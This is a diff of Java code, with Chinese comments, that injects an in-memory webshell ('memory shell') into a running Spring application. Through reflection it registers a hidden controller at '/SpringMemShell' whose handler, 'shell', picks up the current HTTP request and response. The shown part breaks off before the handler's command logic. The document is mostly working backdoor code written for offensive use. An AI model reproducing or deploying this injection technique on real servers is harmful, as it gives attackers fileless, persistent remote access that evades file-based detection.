@@ -20,21 +20,21 @@ public class InjectToController {
         // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
         RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
         // 2. 通过反射获得自定义 controller 中test的 Method 对象
-        Method method2 = InjectToController.class.getMethod("test");
+        Method method2 = InjectToController.class.getMethod("shell");
         // 3. 定义访问 controller 的 URL 地址
-        PatternsRequestCondition url = new PatternsRequestCondition("/malicious");
+        PatternsRequestCondition url = new PatternsRequestCondition("/SpringMemShell");
         // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
         RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
         // 5. 在内存中动态注册 controller
         RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
         // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
-        InjectToController injectToController = new InjectToController("aaa");
+        InjectToController injectToController = new InjectToController("x");
         mappingHandlerMapping.registerMapping(info, injectToController, method2);
     }
     // 第二个构造函数
     public InjectToController(String aaa) {}
     // controller指定的处理方法
-    public void test() throws  IOException{
+    public void shell() throws  IOException{
         // 获取request和response对象
         HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
         HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
